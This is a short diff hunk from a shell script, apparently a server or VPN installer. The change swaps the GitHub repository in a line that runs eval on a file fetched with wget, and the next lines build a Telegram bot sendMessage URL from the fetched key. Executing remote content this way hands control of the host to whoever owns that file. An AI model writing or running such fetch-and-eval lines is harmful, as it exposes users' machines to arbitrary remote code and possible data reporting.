@@ -104,7 +104,7 @@ ZONE=$(
 	)	
 	fi
 clear
-eval $(wget -qO- "https://raw.githubusercontent.com/Ilham24022001/Gantengzz/main/Fls/botkey")
+eval $(wget -qO- "https://raw.githubusercontent.com/gyrogerald/insshx/main/Fls/botkey")
 TIMES="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="_______________________________
